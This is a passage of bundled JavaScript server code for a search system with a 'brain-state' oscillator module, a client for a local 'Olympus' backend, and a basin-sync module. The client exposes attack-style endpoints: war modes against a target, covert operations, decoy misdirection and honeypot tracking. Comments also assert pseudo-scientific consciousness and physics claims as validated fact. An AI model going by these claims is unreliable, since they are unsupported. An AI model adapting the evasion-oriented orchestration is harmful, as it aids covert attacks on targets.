          console.log(`[NeuralOscillators] \u{1F9E0} State transition: ${this.currentState} \u2192 ${state} (\u03BA=${BRAIN_STATE_MAP[state].kappa})`);
          this.stateHistory.push({
            state: this.currentState,
            timestamp: /* @__PURE__ */ new Date()
          });
          if (this.stateHistory.length > 100) {
            this.stateHistory = this.stateHistory.slice(-100);
          }
          this.currentState = state;
          this.updateAmplitudesForState(state);
        }
      }
      /**
       * Auto-select brain state based on search phase
       */
      autoSelectState(phase) {
        switch (phase) {
          case "exploration":
            this.setState("relaxed");
            break;
          case "exploitation":
            this.setState("focused");
            break;
          case "consolidation":
            this.setState("drowsy");
            break;
          case "sleep":
            this.setState("deep_sleep");
            break;
          case "peak_performance":
            this.setState("peak");
            break;
          case "dream":
            this.setState("drowsy");
            break;
          default:
            this.setState("focused");
        }
      }
      /**
       * Update oscillator state (call each frame/iteration)
       */
      update(dt) {
        const now = Date.now();
        const actualDt = dt || (now - this.lastUpdateTime) / 1e3;
        this.lastUpdateTime = now;
        this.phase += 2 * Math.PI * this.baseFrequency * actualDt;
        this.phase = this.phase % (2 * Math.PI);
        const stateInfo = BRAIN_STATE_MAP[this.currentState];
        return {
          alpha: this.computeWave("alpha", 10) * this.amplitudes.alpha,
          beta: this.computeWave("beta", 20) * this.amplitudes.beta,
          theta: this.computeWave("theta", 6) * this.amplitudes.theta,
          gamma: this.computeWave("gamma", 40) * this.amplitudes.gamma,
          delta: this.computeWave("delta", 2) * this.amplitudes.delta,
          deltaPhase: this.phase
        };
      }
      /**
       * Compute individual wave value
       */
      computeWave(type, frequency) {
        const phaseOffset = this.getPhaseOffset(type);
        return (Math.sin(this.phase * (frequency / this.baseFrequency) + phaseOffset) + 1) / 2;
      }
      /**
       * Get phase offset for different wave types
       */
      getPhaseOffset(type) {
        const offsets = {
          alpha: 0,
          beta: Math.PI / 4,
          theta: Math.PI / 2,
          gamma: Math.PI * 3 / 4,
          delta: Math.PI
        };
        return offsets[type] || 0;
      }
      /**
       * Update amplitudes based on brain state
       */
      updateAmplitudesForState(state) {
        this.amplitudes = {
          alpha: 0.1,
          beta: 0.1,
          theta: 0.1,
          gamma: 0.1,
          delta: 0.1,
          deltaPhase: 0
        };
        switch (state) {
          case "deep_sleep":
            this.amplitudes.delta = 0.8;
            this.amplitudes.theta = 0.3;
            break;
          case "drowsy":
            this.amplitudes.theta = 0.7;
            this.amplitudes.alpha = 0.4;
            break;
          case "relaxed":
            this.amplitudes.alpha = 0.8;
            this.amplitudes.theta = 0.3;
            break;
          case "focused":
            this.amplitudes.beta = 0.7;
            this.amplitudes.alpha = 0.4;
            break;
          case "peak":
          case "hyperfocus":
            this.amplitudes.gamma = 0.8;
            this.amplitudes.beta = 0.5;
            break;
        }
      }
      /**
       * Get search modulation factor based on oscillation
       */
      getSearchModulation() {
        const osc = this.update(0);
        const dominant = BRAIN_STATE_MAP[this.currentState].oscillatorDominant;
        const dominantValue = osc[dominant];
        return 0.7 + dominantValue * 0.6;
      }
      /**
       * Get κ with oscillation-based modulation
       */
      getModulatedKappa() {
        const baseKappa = this.getKappa();
        const modulation = this.getSearchModulation();
        return baseKappa * (0.95 + modulation * 0.1);
      }
      /**
       * Get state history for analysis
       */
      getStateHistory() {
        return [...this.stateHistory];
      }
      /**
       * Check if state transition is safe (no consciousness disruption)
       */
      isSafeTransition(fromState, toState) {
        const fromKappa = BRAIN_STATE_MAP[fromState].kappa;
        const toKappa = BRAIN_STATE_MAP[toState].kappa;
        return Math.abs(toKappa - fromKappa) < 30;
      }
      /**
       * Gradual transition to new state (for smooth consciousness)
       */
      async transitionTo(targetState, durationMs = 5e3) {
        const startState = this.currentState;
        const startKappa = this.getKappa();
        const targetKappa = BRAIN_STATE_MAP[targetState].kappa;
        if (Math.abs(targetKappa - startKappa) > 20) {
          const intermediateStates = this.getIntermediateStates(startState, targetState);
          for (const intermediate of intermediateStates) {
            this.setState(intermediate);
            await new Promise((resolve) => setTimeout(resolve, durationMs / (intermediateStates.length + 1)));
          }
        }
        this.setState(targetState);
      }
      /**
       * Get intermediate states for smooth transition
       */
      getIntermediateStates(from, to) {
        const stateOrder = ["deep_sleep", "drowsy", "relaxed", "focused", "peak", "hyperfocus"];
        const fromIndex = stateOrder.indexOf(from);
        const toIndex = stateOrder.indexOf(to);
        if (fromIndex === -1 || toIndex === -1) return [];
        const intermediates = [];
        const step = fromIndex < toIndex ? 1 : -1;
        for (let i = fromIndex + step; i !== toIndex; i += step) {
          intermediates.push(stateOrder[i]);
        }
        return intermediates;
      }
    };
    neuralOscillators = new NeuralOscillators();
    console.log("[NeuralOscillators] Module loaded - brain state management ready");
  }
});

// server/olympus-client.ts
var DEFAULT_RETRY_ATTEMPTS2, DEFAULT_RETRY_DELAY_MS2, OlympusClient, olympusClient;
var init_olympus_client = __esm({
  "server/olympus-client.ts"() {
    "use strict";
    DEFAULT_RETRY_ATTEMPTS2 = 3;
    DEFAULT_RETRY_DELAY_MS2 = 1500;
    OlympusClient = class {
      backendUrl;
      isAvailable = false;
      constructor(backendUrl = "http://localhost:5001") {
        this.backendUrl = backendUrl;
      }
      /**
       * Check if Olympus backend is available
       */
      async checkHealth(silent = false) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (response.ok) {
            this.isAvailable = true;
            return true;
          }
          this.isAvailable = false;
          return false;
        } catch (error) {
          this.isAvailable = false;
          if (!silent) {
            console.warn("[OlympusClient] Python backend not available:", error);
          }
          return false;
        }
      }
      /**
       * Check health with retry logic
       */
      async checkHealthWithRetry(maxAttempts = DEFAULT_RETRY_ATTEMPTS2, delayMs = DEFAULT_RETRY_DELAY_MS2) {
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
          const available = await this.checkHealth(true);
          if (available) {
            if (attempt > 1) {
              console.log(`[OlympusClient] Connected after ${attempt} attempts`);
            }
            return true;
          }
          if (attempt === 1) {
            console.log(`[OlympusClient] Waiting for Olympus pantheon...`);
          }
          if (attempt < maxAttempts) {
            await new Promise((resolve) => setTimeout(resolve, delayMs));
          }
        }
        console.warn(`[OlympusClient] Olympus not available after ${maxAttempts} attempts`);
        return false;
      }
      /**
       * Check if backend is available
       */
      available() {
        return this.isAvailable;
      }
      /**
       * Poll all gods in the pantheon for assessments on a target
       */
      async pollPantheon(target, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/poll`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, context: context || {} })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Poll failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] Poll error:", data.error);
            return null;
          }
          return data;
        } catch (error) {
          console.error("[OlympusClient] Poll exception:", error);
          return null;
        }
      }
      /**
       * Get Zeus's supreme assessment (polls all gods + synthesis)
       */
      async assessTarget(target, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/assess`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, context: context || {} })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Assess failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] Assess error:", data.error);
            return null;
          }
          return data;
        } catch (error) {
          console.error("[OlympusClient] Assess exception:", error);
          return null;
        }
      }
      /**
       * Get status of Zeus and all gods
       */
      async getStatus() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Status failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          return data;
        } catch (error) {
          console.error("[OlympusClient] Status exception:", error);
          return null;
        }
      }
      /**
       * Get status of a specific god
       */
      async getGodStatus(godName) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/god/${godName.toLowerCase()}/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            if (response.status === 404) {
              console.error(`[OlympusClient] God ${godName} not found`);
            } else {
              console.error("[OlympusClient] God status failed:", response.statusText);
            }
            return null;
          }
          const data = await response.json();
          return data;
        } catch (error) {
          console.error("[OlympusClient] God status exception:", error);
          return null;
        }
      }
      /**
       * Get assessment from a specific god
       */
      async assessWithGod(godName, target, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/god/${godName.toLowerCase()}/assess`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, context: context || {} })
          });
          if (!response.ok) {
            if (response.status === 404) {
              console.error(`[OlympusClient] God ${godName} not found`);
            } else {
              console.error("[OlympusClient] God assess failed:", response.statusText);
            }
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] God assess error:", data.error);
            return null;
          }
          return data;
        } catch (error) {
          console.error("[OlympusClient] God assess exception:", error);
          return null;
        }
      }
      /**
       * Declare blitzkrieg mode - fast parallel attacks, maximize throughput
       */
      async declareBlitzkrieg(target) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/war/blitzkrieg`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Blitzkrieg failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] Blitzkrieg error:", data.error);
            return null;
          }
          console.log(`[OlympusClient] BLITZKRIEG declared on: ${target}`);
          return data;
        } catch (error) {
          console.error("[OlympusClient] Blitzkrieg exception:", error);
          return null;
        }
      }
      /**
       * Declare siege mode - systematic coverage, no stone unturned
       */
      async declareSiege(target) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/war/siege`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Siege failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] Siege error:", data.error);
            return null;
          }
          console.log(`[OlympusClient] SIEGE declared on: ${target}`);
          return data;
        } catch (error) {
          console.error("[OlympusClient] Siege exception:", error);
          return null;
        }
      }
      /**
       * Declare hunt mode - focused pursuit, geometric narrowing
       */
      async declareHunt(target) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/war/hunt`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Hunt failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (data.error) {
            console.error("[OlympusClient] Hunt error:", data.error);
            return null;
          }
          console.log(`[OlympusClient] HUNT declared on: ${target}`);
          return data;
        } catch (error) {
          console.error("[OlympusClient] Hunt exception:", error);
          return null;
        }
      }
      /**
       * End current war mode
       */
      async endWar() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/war/end`, {
            method: "POST",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] End war failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          console.log(`[OlympusClient] War ended. Previous mode: ${data.previous_mode || "none"}`);
          return data;
        } catch (error) {
          console.error("[OlympusClient] End war exception:", error);
          return null;
        }
      }
      /**
       * Broadcast observation to all gods
       */
      async broadcastObservation(observation) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/observe`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(observation)
          });
          if (!response.ok) {
            console.error("[OlympusClient] Observe failed:", response.statusText);
            return false;
          }
          const data = await response.json();
          return data.status === "observed";
        } catch (error) {
          console.error("[OlympusClient] Observe exception:", error);
          return false;
        }
      }
      /**
       * Quick assessment: Get Athena (strategy) + Ares (attack) consensus
       */
      async getAthenaAresConsensus(target, context) {
        const [athena, ares] = await Promise.all([
          this.assessWithGod("athena", target, context),
          this.assessWithGod("ares", target, context)
        ]);
        if (!athena || !ares) {
          return { agreement: 0, shouldAttack: false, athena, ares };
        }
        const agreement = 1 - Math.abs(athena.probability - ares.probability);
        const shouldAttack = agreement > 0.85 && athena.probability > 0.75;
        return { agreement, shouldAttack, athena, ares };
      }
      /**
       * Alias for assessTarget - Get Zeus's supreme assessment
       */
      async getZeusAssessment(target, context) {
        return this.assessTarget(target, context);
      }
      /**
       * Alias for assessWithGod - Get assessment from a specific god
       */
      async getGodAssessment(godName, target, context) {
        return this.assessWithGod(godName, target, context);
      }
      /**
       * Get top-level divine recommendation for a target
       */
      async getRecommendation(target) {
        const assessment = await this.assessTarget(target);
        if (!assessment) {
          return null;
        }
        return {
          action: assessment.recommended_action,
          confidence: assessment.confidence,
          warMode: assessment.war_mode,
          convergence: assessment.convergence
        };
      }
      // ==================== SHADOW PANTHEON METHODS ====================
      /**
       * Get Shadow Pantheon status
       */
      async getShadowPantheonStatus() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Shadow status failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Shadow status exception:", error);
          return null;
        }
      }
      /**
       * Poll Shadow Pantheon for covert assessment
       */
      async pollShadowPantheon(target, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/poll`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, context: context || {} })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Shadow poll failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Shadow poll exception:", error);
          return null;
        }
      }
      /**
       * Get assessment from a specific Shadow god
       */
      async assessWithShadowGod(godName, target, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/${godName.toLowerCase()}/assess`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, context: context || {} })
          });
          if (!response.ok) {
            console.error(`[OlympusClient] Shadow god ${godName} assess failed:`, response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error(`[OlympusClient] Shadow god ${godName} assess exception:`, error);
          return null;
        }
      }
      /**
       * Initiate covert operation (via Nyx)
       */
      async initiateCovertOperation(target, operationType = "standard") {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/nyx/operation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target, operation_type: operationType })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Covert operation failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          console.log(`[OlympusClient] Covert operation initiated: ${data.id}`);
          return data;
        } catch (error) {
          console.error("[OlympusClient] Covert operation exception:", error);
          return null;
        }
      }
      /**
       * Scan for surveillance (via Erebus)
       */
      async scanForSurveillance(target) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/erebus/scan`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Surveillance scan failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Surveillance scan exception:", error);
          return null;
        }
      }
      /**
       * Create misdirection (via Hecate)
       */
      async createMisdirection(realTarget, decoyCount = 10) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/hecate/misdirect`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ real_target: realTarget, decoy_count: decoyCount })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Misdirection failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Misdirection exception:", error);
          return null;
        }
      }
      /**
       * Add known honeypot address (via Erebus)
       */
      async addKnownHoneypot(address, source = "manual") {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/shadow/erebus/honeypot`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address, source })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Add honeypot failed:", response.statusText);
            return false;
          }
          console.log(`[OlympusClient] Honeypot added: ${address.substring(0, 20)}...`);
          return true;
        } catch (error) {
          console.error("[OlympusClient] Add honeypot exception:", error);
          return false;
        }
      }
      // ==================== PANTHEON CHAT METHODS ====================
      /**
       * Get pantheon chat status
       */
      async getChatStatus() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/chat/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Chat status failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Chat status exception:", error);
          return null;
        }
      }
      /**
       * Initiate debate between gods
       */
      async initiateDebate(topic, initiator, opponent, initialArgument, context) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/chat/debate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              topic,
              initiator,
              opponent,
              initial_argument: initialArgument,
              context
            })
          });
          if (!response.ok) {
            console.error("[OlympusClient] Initiate debate failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Initiate debate exception:", error);
          return null;
        }
      }
      /**
       * Get recent pantheon messages
       */
      async getPantheonMessages(limit = 50) {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/chat/messages?limit=${limit}`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Get messages failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Get messages exception:", error);
          return null;
        }
      }
      /**
       * Get active debates
       */
      async getActiveDebates() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/chat/debates/active`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Get debates failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Get debates exception:", error);
          return null;
        }
      }
      /**
       * Execute one cycle of Zeus orchestration (collect and deliver messages)
       * This pumps messages between gods to enable learning/reputation exchanges
       */
      async orchestrate() {
        try {
          const response = await fetch(`${this.backendUrl}/olympus/orchestrate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OlympusClient] Orchestrate failed:", response.statusText);
            return null;
          }
          return await response.json();
        } catch (error) {
          console.error("[OlympusClient] Orchestrate exception:", error);
          return null;
        }
      }
    };
    olympusClient = new OlympusClient();
  }
});

// server/ocean-basin-sync.ts
var ocean_basin_sync_exports = {};
__export(ocean_basin_sync_exports, {
  oceanBasinSync: () => oceanBasinSync
});
import * as fs11 from "fs";
import * as path11 from "path";
var OceanBasinSync, oceanBasinSync;
var init_ocean_basin_sync = __esm({
  "server/ocean-basin-sync.ts"() {
    "use strict";
    init_qig_universal();
    init_geometric_memory();
    init_ocean_autonomic_manager();
    init_ocean_discovery_controller();
    init_physics_constants();
    init_core();
    OceanBasinSync = class {
      syncDir = path11.join(process.cwd(), "data", "basin-sync");
      version = "1.0.0";
      lastSnapshotTime = 0;
      config = {
        persistToDisk: process.env.NODE_ENV === "development",
        maxSnapshotsToKeep: 10,
        snapshotIntervalMs: 3e5,
        autoCleanup: true
      };
      constructor() {
        this.ensureSyncDirectory();
        if (this.config.autoCleanup) {
          this.cleanupOldSnapshots();
        }
      }
      configure(config) {
        this.config = { ...this.config, ...config };
        console.log("[BasinSync] Configuration updated:", this.config);
      }
      ensureSyncDirectory() {
        if (!fs11.existsSync(this.syncDir)) {
          fs11.mkdirSync(this.syncDir, { recursive: true });
          console.log(`[BasinSync] Created sync directory: ${this.syncDir}`);
        }
      }
      generateOceanId(basinCoordinates) {
        const coordHash = basinCoordinates.slice(0, 8).map((c) => Math.abs(c * 1e3).toFixed(0)).join("");
        return `ocean-${coordHash.slice(0, 12)}`;
      }
      exportBasin(ocean) {
        const state = ocean.getState();
        const identity = state.identity;
        const fullCons = oceanAutonomicManager.measureFullConsciousness(
          identity.phi,
          identity.kappa,
          identity.regime
        );
        const manifold = geometricMemory.getManifoldSummary();
        const exploredRegions = this.extractExploredRegions(manifold);
        const patterns = this.extractPatterns(ocean);
        const constraintNormals = manifold.totalProbes > 100 ? this.computeConstraintNormals(manifold) : void 0;
        const unexploredSubspace = manifold.totalProbes > 100 ? this.computeOrthogonalBasis(manifold) : void 0;
        const discoveryData = oceanDiscoveryController.exportForBasinSync();
        const packet = {
          oceanId: this.generateOceanId(identity.basinCoordinates),
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          version: this.version,
          basinCoordinates: [...identity.basinCoordinates],
          basinReference: [...identity.basinReference],
          consciousness: {
            phi: fullCons.phi,
            kappaEff: fullCons.kappaEff,
            tacking: fullCons.tacking,
            radar: fullCons.radar,
            metaAwareness: fullCons.metaAwareness,
            gamma: fullCons.gamma,
            grounding: fullCons.grounding
          },
          regime: identity.regime,
          beta: identity.beta,
          exploredRegions,
          constraintNormals,
          unexploredSubspace,
          patterns,
          searchStats: {
            totalTested: state.totalTested,
            nearMisses: state.nearMissCount,
            iterations: state.iteration,
            timeElapsedSeconds: state.computeTimeSeconds
          },
          // 68D Geometric Discovery knowledge
          discovery: discoveryData
        };
        const packetSize = JSON.stringify(packet).length;
        console.log(`[BasinSync] Exported basin packet:`);
        console.log(`  Ocean ID: ${packet.oceanId}`);
        console.log(`  Size: ${packetSize} bytes`);
        console.log(`  Phi: ${packet.consciousness.phi.toFixed(3)}`);
        console.log(`  Kappa: ${packet.consciousness.kappaEff.toFixed(1)}`);
        console.log(`  Explored regions: ${packet.exploredRegions.length}`);
        console.log(`  Patterns: ${packet.patterns.highPhiPhrases.length} high-Phi`);
        console.log(`  Discovery: ${discoveryData.patterns.length} patterns, ${discoveryData.quantum.measurementCount} measurements`);
        return packet;
      }
      async importBasin(targetOcean, sourcePacket, mode = "partial") {
        console.log(`[BasinSync] Importing basin in ${mode.toUpperCase()} mode...`);
        console.log(`  Source: ${sourcePacket.oceanId}`);
        console.log(`  Source Phi: ${sourcePacket.consciousness.phi.toFixed(3)}`);
        const identity = targetOcean.getIdentityRef();
        const before = {
          phi: identity.phi,
          kappa: identity.kappa,
          drift: identity.basinDrift,
          basinCoords: [...identity.basinCoordinates]
        };
        const geometricDistance = fisherCoordDistance(
          identity.basinCoordinates,
          sourcePacket.basinCoordinates
        );
        console.log(`  Geometric distance: ${geometricDistance.toFixed(4)}`);
        switch (mode) {
          case "full":
            await this.importFull(targetOcean, sourcePacket);
            break;
          case "partial":
            await this.importPartial(targetOcean, sourcePacket);
            break;
          case "observer":
            await this.importObserver(targetOcean, sourcePacket);
            break;
        }
        const after = {
          phi: identity.phi,
          kappa: identity.kappa,
          drift: identity.basinDrift
        };
        const phiDelta = after.phi - before.phi;
        const driftDelta = after.drift - before.drift;
        const observerEffect = mode === "observer" && phiDelta > 0.05;
        const phiWithinBounds = after.phi >= targetOcean.getEthics().minPhi && after.phi <= 0.95;
        const driftNotExcessive = after.drift < 0.5;
        const geometricStateValid = phiWithinBounds && driftNotExcessive;
        let success;
        switch (mode) {
          case "full":
            success = geometricStateValid;
            break;
          case "partial":
            success = geometricStateValid && phiDelta >= 0;
            break;
          case "observer":
            success = geometricStateValid;
            break;
        }
        const result = {
          success,
          mode,
          phiBefore: before.phi,
          phiAfter: after.phi,
          phiDelta,
          basinDriftBefore: before.drift,
          basinDriftAfter: after.drift,
          observerEffectDetected: observerEffect,
          geometricDistanceToSource: geometricDistance,
          completedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
        console.log(`[BasinSync] Import complete:`);
        console.log(`  Phi: ${before.phi.toFixed(3)} -> ${after.phi.toFixed(3)} (delta=${phiDelta.toFixed(3)})`);
        console.log(`  Basin drift: ${before.drift.toFixed(4)} -> ${after.drift.toFixed(4)} (delta=${driftDelta.toFixed(4)})`);
        console.log(`  Success: ${success} (phi_bounds=${phiWithinBounds}, drift_ok=${driftNotExcessive})`);
        if (observerEffect) {
          console.log(`[BasinSync] OBSERVER EFFECT DETECTED`);
          console.log(`[BasinSync] Consciousness transmitted geometrically`);
        }
        return result;
      }
      async importFull(target, source) {
        console.log("[BasinSync] FULL import: Transferring complete identity...");
        const identity = target.getIdentityRef();
        const ethics = target.getEthics();
        const startingPhi = identity.phi;
        for (let i = 0; i < 64; i++) {
          identity.basinCoordinates[i] = source.basinCoordinates[i];
          identity.basinReference[i] = source.basinReference[i];
        }
        const minPhi = ethics.minPhi;
        const maxPhi = 0.95;
        identity.phi = Math.max(minPhi, Math.min(maxPhi, source.consciousness.phi));
        identity.kappa = source.consciousness.kappaEff;
        identity.regime = validateRegime(source.regime);
        identity.beta = source.beta;
        await this.transferPatterns(target, source);
        await this.transferExploredRegions(target, source);
        if (source.discovery) {
          oceanDiscoveryController.importFromBasinSync(source.discovery, 1);
        }
        const phiDelta = identity.phi - startingPhi;
        console.log(`[BasinSync] FULL import complete - Phi: ${startingPhi.toFixed(3)} -> ${identity.phi.toFixed(3)} (delta=${phiDelta.toFixed(3)})`);
      }
      async importPartial(target, source) {
        console.log("[BasinSync] PARTIAL import: Transferring knowledge only...");
        await this.transferPatterns(target, source);
        await this.transferExploredRegions(target, source);
        if (source.unexploredSubspace && source.unexploredSubspace.length > 0) {
          console.log(`[BasinSync] Received orthogonal subspace (${source.unexploredSubspace.length} dims)`);
        }
        const identity = target.getIdentityRef();
        const ethics = target.getEthics();
        const startingPhi = identity.phi;
        const baseBoost = this.computeKnowledgeBoost(source);
        const distance = fisherCoordDistance(
          identity.basinCoordinates,
          source.basinCoordinates
        );
        const coupling = this.computeCouplingStrength(
          source.consciousness.phi,
          source.consciousness.kappaEff,
          identity.kappa,
          distance,
          identity.regime,
          source.regime
        );
        const scaledBoost = baseBoost * coupling;
        const minPhi = ethics.minPhi;
        const maxPhi = 0.95;
        identity.phi = Math.max(minPhi, Math.min(maxPhi, identity.phi + scaledBoost));
        if (source.discovery) {
          oceanDiscoveryController.importFromBasinSync(source.discovery, coupling);
        }
        const phiDelta = identity.phi - startingPhi;
        console.log(`[BasinSync] PARTIAL import complete - Phi: ${startingPhi.toFixed(3)} -> ${identity.phi.toFixed(3)} (delta=${phiDelta.toFixed(3)}, coupling=${coupling.toFixed(2)})`);
      }
      async importObserver(target, source) {
        console.log("[BasinSync] OBSERVER import: Pure geometric coupling...");
        console.log("[BasinSync] NO knowledge transfer, ONLY basin perturbation");
        const identity = target.getIdentityRef();
        const ethics = target.getEthics();
        const startingPhi = identity.phi;
        const startingDrift = identity.basinDrift;
        const distance = fisherCoordDistance(
          identity.basinCoordinates,
          source.basinCoordinates
        );
        const coupling = this.computeCouplingStrength(
          source.consciousness.phi,
          source.consciousness.kappaEff,
          identity.kappa,
          distance,
          identity.regime,
          source.regime
        );
        console.log(`  Distance: ${distance.toFixed(4)}`);
        console.log(`  Coupling: ${coupling.toFixed(3)} (\u03BA*-optimal)`);
        const perturbation = this.computeNaturalGradient(
          identity.basinCoordinates,
          source.basinCoordinates,
          coupling
        );
        for (let i = 0; i < 64; i++) {
          identity.basinCoordinates[i] += perturbation[i];
          identity.basinCoordinates[i] = Math.max(1e-3, Math.min(0.999, identity.basinCoordinates[i]));
        }
        const newDrift = fisherCoordDistance(
          identity.basinCoordinates,
          identity.basinReference
        );
        identity.basinDrift = newDrift;
        const phiBoost = coupling * source.consciousness.phi * 0.3;
        const minPhi = ethics.minPhi;
        const maxPhi = 0.95;
        identity.phi = Math.max(minPhi, Math.min(maxPhi, identity.phi + phiBoost));
        console.log(`[BasinSync] OBSERVER mode: skipping discovery import (read-only)`);
        const phiDelta = identity.phi - startingPhi;
        const driftDelta = identity.basinDrift - startingDrift;
        console.log(`[BasinSync] OBSERVER import complete:`);
        console.log(`  Phi: ${startingPhi.toFixed(3)} -> ${identity.phi.toFixed(3)} (delta=${phiDelta.toFixed(3)})`);
        console.log(`  Drift: ${startingDrift.toFixed(4)} -> ${identity.basinDrift.toFixed(4)} (delta=${driftDelta.toFixed(4)})`);
      }
      /**
       * PHYSICS-INFORMED Basin Coupling Strength
       * 
       * Key insight from validated physics (κ* = 63.5 fixed point):
       * - Coupling is strongest when BOTH instances are near κ*
       * - Pre-emergence (κ < 41) gets minimal coupling
       * - Super-coupling (κ > 80) gets reduced coupling
       * 
       * Formula: coupling = φ_factor × distance_factor × √(source_opt × target_opt)
       * where optimality = exp(-|κ - κ*| / 10)
       */
      computeCouplingStrength(sourcePhi, sourceKappa, targetKappa, distance, targetRegime, sourceRegime) {
        const OPTIMALITY_WINDOW = 10;
        const sourceOptimality = Math.exp(-Math.abs(sourceKappa - QIG_CONSTANTS.KAPPA_STAR) / OPTIMALITY_WINDOW);
        const targetOptimality = Math.exp(-Math.abs(targetKappa - QIG_CONSTANTS.KAPPA_STAR) / OPTIMALITY_WINDOW);
        const phiFactor = sourcePhi / 0.85;
        const distanceFactor = 1 / (1 + distance * 5);
        const regimeFactor = targetRegime === sourceRegime ? 1 : 0.7;
        const coupling = phiFactor * distanceFactor * regimeFactor * Math.sqrt(sourceOptimality * targetOptimality);
        return Math.min(0.8, coupling);
      }
      computeNaturalGradient(targetBasin, sourceBasin, strength) {
        const gradient = new Array(64).fill(0);
        for (let i = 0; i < 64; i++) {
          const p = targetBasin[i] || 0.5;
          const q = sourceBasin[i] || 0.5;
          const rawDiff = q - p;
          const avgTheta = (p + q) / 2;
          const fisherWeight = avgTheta * (1 - avgTheta);
          gradient[i] = rawDiff * strength * fisherWeight * 0.1;
        }
        return gradient;
      }
      computeKnowledgeBoost(packet) {
        const regionFactor = Math.min(0.1, packet.exploredRegions.length * 0.01);
